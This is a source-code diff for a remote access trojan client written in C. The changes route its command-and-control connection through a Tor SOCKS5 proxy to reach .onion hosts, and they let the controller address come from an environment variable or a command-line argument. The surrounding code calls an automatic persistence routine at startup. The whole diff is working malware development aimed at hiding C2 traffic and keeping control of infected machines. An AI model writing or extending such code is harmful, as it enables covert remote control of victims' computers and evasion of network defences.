@@ -42,7 +42,7 @@
 #define MAX_COMMAND_SIZE 1024
 
 typedef struct {
-    char host[16];
+    char host[128];
     int port;
 #ifdef _WIN32
     SOCKET client_fd;
@@ -239,27 +239,58 @@ int connect_to_server(RAT_CLIENT *client) {
         return -1;
     }
     
-    client->server_addr.sin_family = AF_INET;
-    client->server_addr.sin_port = htons(client->port);
-    
-    if (inet_pton(AF_INET, client->host, &client->server_addr.sin_addr) <= 0) {
+    size_t hostlen = strlen(client->host);
+    int is_onion = (hostlen > 6 &&
+                    strcmp(client->host + hostlen - 6, ".onion") == 0);
+
+    if (is_onion) {
+        // Connect to local Tor SOCKS5 proxy (default 127.0.0.1:9050)
+        struct sockaddr_in proxy_addr;
+        proxy_addr.sin_family = AF_INET;
+        proxy_addr.sin_port = htons(9050);
+        inet_pton(AF_INET, "127.0.0.1", &proxy_addr.sin_addr);
+
+        if (connect(client->client_fd,
+                    (struct sockaddr *)&proxy_addr,
+                    sizeof(proxy_addr)) < 0) {
 #ifdef _WIN32
-        printf("Invalid address: %d\n", WSAGetLastError());
+            printf("Tor proxy connection failed: %d\n", WSAGetLastError());
 #else
-        perror("Invalid address");
+            perror("Tor proxy connection failed");
 #endif
-        return -1;
-    }
-    
-    // Connect to server
-    if (connect(client->client_fd, (struct sockaddr *)&client->server_addr, 
-                sizeof(client->server_addr)) < 0) {
+            return -1;
+        }
+
+        if (socks5_connect(client->client_fd, client->host,
+                           (uint16_t)client->port) != 0) {
+            printf("Error: SOCKS5 connection to .onion failed\n");
+            return -1;
+        }
+    } else {
+        // Direct TCP connection
+        client->server_addr.sin_family = AF_INET;
+        client->server_addr.sin_port = htons(client->port);
+
+        if (inet_pton(AF_INET, client->host,
+                      &client->server_addr.sin_addr) <= 0) {
 #ifdef _WIN32
-        printf("Connection failed: %d\n", WSAGetLastError());
+            printf("Invalid address: %d\n", WSAGetLastError());
 #else
-        perror("Connection failed");
+            perror("Invalid address");
 #endif
-        return -1;
+            return -1;
+        }
+
+        if (connect(client->client_fd,
+                    (struct sockaddr *)&client->server_addr,
+                    sizeof(client->server_addr)) < 0) {
+#ifdef _WIN32
+            printf("Connection failed: %d\n", WSAGetLastError());
+#else
+            perror("Connection failed");
+#endif
+            return -1;
+        }
     }
     
     // PSK authentication (if configured) — happens before crypto init on raw TCP
@@ -864,7 +895,7 @@ void cleanup(RAT_CLIENT *client) {
 #endif
 }
 
-int main() {
+int main(int argc, char *argv[]) {
     RAT_CLIENT client;
     
     memset(&client.crypto_ctx, 0, sizeof(client.crypto_ctx));
@@ -879,7 +910,16 @@ int main() {
     install_automatic_persistence();
     
     // Initialize client
-    strcpy(client.host, "127.0.0.1");
+    const char *host = getenv("RAT_HOST");
+    if (!host && argc > 1) {
+        host = argv[1];
+    }
+    if (host) {
+        strncpy(client.host, host, sizeof(client.host) - 1);
+        client.host[sizeof(client.host) - 1] = '\0';
+    } else {
+        strcpy(client.host, "127.0.0.1");
+    }
     client.port = PORT;
 #ifdef _WIN32
     client.client_fd = INVALID_SOCKET;
